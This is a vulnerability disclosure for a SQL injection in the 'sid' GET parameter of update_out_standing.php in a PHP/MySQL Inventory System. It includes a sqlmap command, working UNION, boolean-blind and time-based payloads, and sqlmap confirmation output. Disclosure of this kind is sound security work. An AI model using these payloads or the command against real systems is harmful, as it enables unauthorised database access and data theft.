# SQL Injection in Inventory System (Update Outstanding)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Update Outstanding (`update_out_standing.php`)
* **Vulnerable Parameter**: `sid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `update_out_standing.php` file.

The application fails to properly sanitize the `sid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries** (23 columns), attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP GET request to `update_out_standing.php` injecting SQL into the `sid` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/update_out_standing.php?sid=PR362&table=stock_entries&return=view_out_standing.php" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
sid=-4182' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170786271,0x72706b76647a4d425a4c496b4445764e65626c6b66497947427655637663776c447552616263514e,0x7171627071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&table=stock_entries&return=view_out_standing.php

```

**Boolean-based Blind Payload:**

```sql
sid=PR362' RLIKE (SELECT (CASE WHEN (2262=2262) THEN 0x5052333632 ELSE 0x28 END))-- Vezg&table=stock_entries&return=view_out_standing.php

```

**Time-based Blind Payload:**

```sql
sid=PR362' AND (SELECT 5842 FROM (SELECT(SLEEP(5)))uqQs)-- vCnG&table=stock_entries&return=view_out_standing.php

```

## Proof of Concept

The following output from `sqlmap` confirms that the `sid` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: sid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: sid=PR362' RLIKE (SELECT (CASE WHEN (2262=2262) THEN 0x5052333632 ELSE 0x28 END))-- Vezg&table=stock_entries&return=view_out_standing.php
    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sid=PR362' AND (SELECT 5842 FROM (SELECT(SLEEP(5)))uqQs)-- vCnG&table=stock_entries&return=view_out_standing.php
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: MySQL UNION query (NULL) - 23 columns
    Payload: sid=-4182' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7170786271,0x72706b76647a4d425a4c496b4445764e65626c6b66497947427655637663776c447552616263514e,0x7171627071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&table=stock_entries&return=view_out_standing.php
    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
---
[INFO] the back-end DBMS is MySQL

```

<img width="1057" height="365" alt="图片" src="https://github.com/user-attachments/assets/70bca735-5fdd-4d71-b6be-20c5a291cb65" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
